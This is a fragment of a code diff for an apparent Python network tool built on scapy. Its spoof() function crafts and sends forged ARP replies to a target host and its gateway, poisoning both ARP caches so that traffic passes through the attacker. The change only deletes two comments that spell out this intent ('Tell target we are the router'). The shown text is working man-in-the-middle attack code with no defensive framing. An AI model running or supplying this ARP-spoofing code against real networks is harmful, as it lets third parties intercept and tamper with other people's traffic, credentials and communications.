@@ -7,9 +7,7 @@ def get_device_info(ip):
     return (ans[0][1].hwsrc, "Known") if ans else (None, None)
 
 def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
-    # Tell target we are the router
     t_pkt = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-    # Tell router we are the target
     g_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
     scapy.sendp(t_pkt, verbose=False)
     scapy.sendp(g_pkt, verbose=False)
